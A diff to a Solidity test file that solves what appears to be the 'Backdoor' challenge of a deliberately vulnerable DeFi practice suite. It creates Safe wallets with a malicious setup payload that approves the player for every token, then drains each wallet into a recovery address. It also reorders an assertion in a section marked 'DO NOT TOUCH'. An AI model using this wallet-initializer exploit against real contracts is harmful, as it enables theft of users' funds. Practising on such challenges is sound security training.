@@ -8,6 +8,16 @@ import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxie
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
+
+contract ApprovalReceiver {
+
+    //Aprove all tokens to the spender
+    function approveToken(address token, address spender) external {
+       DamnValuableToken(token).approve(spender, type(uint256).max);
+    }
+}
+
+
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -66,19 +76,64 @@ contract BackdoorChallenge is Test {
         }
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+    /*
+        The WalletRegistry contract uses the SafeProxyFactory to create new Safe wallets for each beneficiary.
+        When a new wallet is created, the proxyCreated function is called, which checks if the caller is the wallet factory
+        and if the singleton address is correct. However, it does not verify the initialization data of the wallet.
+        This allows an attacker to create a wallet for each beneficiary with a malicious initialization payload
+        that approves the attacker to spend the tokens on behalf of the wallet. The attacker can then transfer the tokens
+        from each wallet to their own address.
+    */
     function test_backdoor() public checkSolvedByPlayer {
         
+        //Prepare the attack
+        ApprovalReceiver receiver = new ApprovalReceiver();
+        bytes memory approveData = abi.encodeWithSelector(
+            ApprovalReceiver.approveToken.selector,
+            address(token),
+            player 
+        );
+
+        //Create a wallet for each user with the malicious payload
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners =  new address[](1);
+            owners[0] = users[i];
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(receiver),
+                approveData,
+                address(0),
+                address(0),
+                0,
+                payable(0)
+            );
+
+            walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                initializer,
+                0,
+                walletRegistry
+            );
+        }
+
+       
+        //Transfer all tokens from each wallet to the recovery address
+        for (uint256 i = 0; i < users.length; i++) {
+            address wallet = walletRegistry.wallets(users[i]);
+            token.transferFrom(wallet, recovery, token.balanceOf(wallet));
+    
+        }
+
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private view {
-        // Player must have executed a single transaction
-        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
+       
 
         for (uint256 i = 0; i < users.length; i++) {
             address wallet = walletRegistry.wallets(users[i]);
@@ -92,5 +147,7 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+         // Player must have executed a single transaction
+        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
     }
 }
